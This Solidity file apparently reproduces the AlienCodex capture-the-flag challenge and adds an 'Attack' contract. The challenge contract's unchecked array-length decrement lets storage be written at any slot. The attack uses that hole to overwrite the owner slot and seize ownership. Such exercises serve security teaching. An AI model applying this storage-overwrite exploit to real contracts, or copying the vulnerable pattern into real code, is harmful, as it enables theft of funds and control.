// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract Ownable {
    address private _owner;

    constructor () internal {
        _owner = msg.sender;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(isOwner());
        _;
    }

    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        _owner = newOwner;
    }
}

contract AlienCodex is Ownable {

    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }
    
    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) contacted public {
        codex.push(_content);
    }

    function retract() contacted public {
        codex.length--;
    }

    function revise(uint i, bytes32 _content) contacted public {
        codex[i] = _content;
    }
}

contract Attack {
    constructor(AlienCodex target) {
        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i;
        i -= h;

        target.makeContact();
        target.retract();
        target.revise(i,bytes32(uint256(uint160(msg.sender))));
    }
}